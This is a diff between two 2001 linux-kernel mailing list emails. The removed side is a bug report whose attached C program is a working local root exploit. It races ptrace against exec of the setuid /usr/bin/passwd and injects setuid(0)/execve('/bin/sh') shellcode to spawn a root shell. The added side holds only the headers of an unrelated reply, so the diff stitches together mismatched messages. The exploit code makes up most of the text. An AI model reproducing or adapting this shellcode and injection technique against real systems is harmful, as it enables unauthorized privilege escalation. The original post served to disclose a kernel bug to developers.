@@ -1,186 +1,25 @@
 Return-Path: <linux-kernel-owner@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id <S277938AbRJITts>; Tue, 9 Oct 2001 15:49:48 -0400
+	id <S277941AbRJIUAt>; Tue, 9 Oct 2001 16:00:49 -0400
 Received: (majordomo@vger.kernel.org) by vger.kernel.org
-	id <S277939AbRJITtj>; Tue, 9 Oct 2001 15:49:39 -0400
-Received: from [195.116.43.166] ([195.116.43.166]:14583 "HELO test.kki.net.pl")
-	by vger.kernel.org with SMTP id <S277938AbRJITt3>;
-	Tue, 9 Oct 2001 15:49:29 -0400
-Message-ID: <000a01c150fb$6549e700$6400a8c0@czesio>
-From: "Kitwor" <kitwor@kki.net.pl>
-To: <linux-kernel@vger.kernel.org>
-Subject: PROBLEM: old exploit works!!!
-Date: Tue, 9 Oct 2001 21:48:33 +0200
+	id <S277943AbRJIUAj>; Tue, 9 Oct 2001 16:00:39 -0400
+Received: from dfw-smtpout2.email.verio.net ([129.250.36.42]:20729 "EHLO
+	dfw-smtpout2.email.verio.net") by vger.kernel.org with ESMTP
+	id <S277941AbRJIUAf>; Tue, 9 Oct 2001 16:00:35 -0400
+Message-ID: <3BC3577A.E1117F0B@bigfoot.com>
+Date: Tue, 09 Oct 2001 13:00:58 -0700
+From: Tim Moore <timothymoore@bigfoot.com>
+Organization: Yoyodyne Propulsion Systems, Inc.
+X-Mailer: Mozilla 4.78 [en] (X11; U; Linux 2.2.20p10i i686)
+X-Accept-Language: en
 MIME-Version: 1.0
-Content-Type: multipart/mixed;
-	boundary="----=_NextPart_000_0007_01C1510C.2464FCA0"
-X-Priority: 3
-X-MSMail-Priority: Normal
-X-Mailer: Microsoft Outlook Express 6.00.2600.0000
-X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+To: linux-kernel@vger.kernel.org
+Subject: Re: Breaking system configuration in stable kernels
+In-Reply-To: <Pine.LNX.3.96.1011008113808.27023A-100000@gatekeeper.tmr.com>
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
 Sender: linux-kernel-owner@vger.kernel.org
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-This is a multi-part message in MIME format.
 
-------=_NextPart_000_0007_01C1510C.2464FCA0
-Content-Type: text/plain;
-	charset="iso-8859-2"
-Content-Transfer-Encoding: 7bit
-
-Old exploit which works on kernels up to 2.2.18 (itr doesn't work on 2.2.19)
-works on 2.4.9!!
-I attach that exploit.
-
-------=_NextPart_000_0007_01C1510C.2464FCA0
-Content-Type: application/octet-stream;
-	name="c.c"
-Content-Transfer-Encoding: 7bit
-Content-Disposition: attachment;
-	filename="c.c"
-
-#include <stdio.h>
-#include <fcntl.h>
-#include <sys/types.h>
-#include <signal.h>
-#include <linux/user.h>
-#include <sys/wait.h>
-#include <limits.h>
-#include <errno.h>
-#include <stdlib.h>
-
-#define CS_SIGNAL SIGUSR1
-#define VICTIM "/usr/bin/passwd"
-#define SHELL "/bin/sh"
-#define SHELL_LEN "\x07"		/* strlen(SHELL) in hex */
-#define SHELLCODE 0xbfffff00		/* address to put shellcode at */
-/*#define SHELLCODE 0x0804bf04		BSS */
-
-/*
- * This is my private shellcode.
- * Offset 0x0a - executable's filename length.
- */
-char shellcode[1024]=
-	"\x31\xc0\x31\xdb\xb0\x17\xcd\x80"		/* setuid(0) */
-	"\x31\xc0\xb0\x2e\xcd\x80"
-	"\x31\xc0\x50\xeb\x17\x8b\x1c\x24"		/* execve(SHELL) */
-	"\x88\x43" SHELL_LEN "\x89\xe1\x8d\x54\x24"
-	"\x04\xb0\x0b\xcd\x80\x31\xc0\x89"
-	"\xc3\x40\xcd\x80\xe8\xe4\xff\xff"
-	"\xff" SHELL ;
-
-volatile int cs_detector=0;
-
-void cs_sig_handler(int sig)
-{
-	cs_detector=1;
-}
-
-void do_victim(char * filename)
-{
-	while (!cs_detector) ;
-	kill(getppid(), CS_SIGNAL);
-	execl(filename, filename, NULL);
-	perror("execl");
-	exit(-1);
-}
-
-int check_execve(pid_t victim, char * filename)
-{
-	char path[PATH_MAX+1];
-	char link[PATH_MAX+1];
-	int res;
-	
-	snprintf(path, sizeof(path), "/proc/%i/exe", (int)victim);
-	if (readlink(path, link, sizeof(link)-1)<0) {
-		perror("readlink");
-		return -1;
-	}
-	
-	link[sizeof(link)-1]='\0';
-	res=!strcmp(link, filename);
-	if (res) fprintf(stderr, "Child slept outside of execve\n");
-	return res;
-}
-
-int main(int argc, char * argv[])
-{
-	char * filename=VICTIM;
-	pid_t victim;
-	int error, i;
-	unsigned long eip=SHELLCODE;
-	struct user_regs_struct regs;
-
-	if (argc>1) filename=argv[1];
-	if (argc>2) eip=strtoul(argv[2], NULL, 16);
-
-	signal(CS_SIGNAL, cs_sig_handler);
-
-	victim=fork();
-	if (victim<0) {
-		perror("fork: victim");
-		exit(-1);
-	}
-	if (victim==0) do_victim(filename);
-
-	kill(victim, CS_SIGNAL);
-	while (!cs_detector) ;
-	
-	if (ptrace(PTRACE_ATTACH, victim)) {
-		perror("ptrace: PTRACE_ATTACH");
-		goto exit;
-	}
-	
-	if (check_execve(victim, filename))
-		goto exit;
-
-	(void)waitpid(victim, NULL, WUNTRACED);
-	if (ptrace(PTRACE_CONT, victim, 0, 0)) {
-		perror("ptrace: PTRACE_CONT");
-		goto exit;
-	}
-
-	(void)waitpid(victim, NULL, WUNTRACED);
-	
-	if (ptrace(PTRACE_GETREGS, victim, 0, &regs)) {
-		perror("ptrace: PTRACE_GETREGS");
-		goto exit;
-	}
-
-	regs.eip=eip;
-	
-	for (i=0; i<strlen(shellcode); i+=4) {
-		if (ptrace(PTRACE_POKEDATA, victim, regs.eip+i,
-						    *(int*)(shellcode+i))) {
-			perror("ptrace: PTRACE_POKETEXT");
-			goto exit;
-		}
-	}
-
-	if (ptrace(PTRACE_SETREGS, victim, 0, &regs)) {
-		perror("ptrace: PTRACE_SETREGS");
-		goto exit;
-	}
-
-	fprintf(stderr, "Bug exploited successfully.\n");
-	
-	if (ptrace(PTRACE_DETACH, victim, 0, 0)) {
-		perror("ptrace: PTRACE_CONT");
-		goto exit;
-	}
-
-	(void)waitpid(victim, NULL, 0);
-	return 0;
-	
-exit:
-	fprintf(stderr, "Error!\n");
-	kill(victim, SIGKILL);
-	return -1;
-}
-
-------=_NextPart_000_0007_01C1510C.2464FCA0--
-
---- 
-  http://www.zus.cc.pl tego potrzebujesz ! 
---- 
-
+--
